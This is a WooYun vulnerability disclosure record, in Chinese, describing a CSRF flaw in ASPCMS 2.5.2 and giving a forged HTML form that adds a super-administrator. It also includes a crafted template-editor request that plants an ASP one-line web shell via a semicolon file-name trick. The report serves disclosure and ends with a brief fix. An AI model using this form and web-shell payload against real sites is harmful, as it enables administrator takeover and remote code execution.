{"id": 55576, "wybug_id": "wooyun-2014-060508", "wybug_title": "ASPCMS最新版CSRF添加管理员及GetShell", "wybug_corp": "ASPCMS", "wybug_author": "路人甲", "wybug_date": "2014-05-13 11:10", "wybug_open_date": "2014-08-11 11:12", "wybug_type": "CSRF", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "模板文件操作参数未过滤"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-05-13：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2014-08-11：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： ~~ 详细说明：  ASPCMS最新版2.5.2CSRF添加管理员：后台添加管理员的请求如下：链接：http://10.65.203.100:90/admin_aspcms/_user/_Admin/AspCms_AdminAdd.asp?action=addPOST：GroupID=1&LoginName=111111&Password=111111&AdminDesc=111111&UserStatus=1可以看到没有防御CSRF我们构造伪造表单：\n<FORM name=\"form\" action=\"http://10.65.203.100:90/admin_aspcms/_user/_Admin/AspCms_AdminAdd.asp?action=add\" method=\"post\" ><TD align=middle width=100 height=30>管理员组</TD><select name=\"GroupID\" id=\"GroupID\"><option value=\"1\" >超级管理员组</option><option value=\"6\" >lpyuan</option><option value=\"5\" >普通管理员</option></select><TD align=middle width=100 height=30>管理员名称</TD><INPUT class=\"input\" style=\"FONT-SIZE: 12px; WIDTH: 300px\" maxLength=\"200\" name=\"LoginName\"/><TD align=middle width=100 height=30>管理员密码</TD><INPUT  type=\"Password\" class=\"input\" style=\"FONT-SIZE: 12px; WIDTH: 300px\" maxLength=\"200\" name=\"Password\"/> <TD align=middle width=100 height=30>管理员描述</TD><INPUT class=\"input\" style=\"FONT-SIZE: 12px; WIDTH: 300px\" maxLength=\"200\" name=\"AdminDesc\"/><TD align=middle width=100 height=30>状态</TD><INPUT class=\"checkbox\" type=\"checkbox\" name=\"UserStatus\" checked=\"checked\" value=\"1\"/><INPUT class=\"button\" type=\"submit\" value=\"添加\" />  </FORM>\n漏洞利用之前：\n\n\n\nCSRF添加管理员的过程：\n\n未作任何验证，成功添加管理员，来看看添加结果：\n\nCSRF直接GetShell：后台编辑模板时，发送请求如下，我们可以添加模板的filename和filetext：http://10.65.203.100:90/admin_aspcms/_style/AspCms_TemplateAdd.asp?acttype=html&action=addfilename=111111.asp;111111.html&filetext=%3C%25eval%20request%28%5C%27wooyun%5C%27%29%25%3E再此过程中也没有做任何验证，而且对添加模板的文件名也没有严格处理，导致CSRF直接获取webshell：\n\nshell地址为：http://10.65.203.100:90//Templates/cn2014/html/111111.asp;111111.html   漏洞证明：  将详细说明   修复方案：  添加CSRF验证，严格处理文件名   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}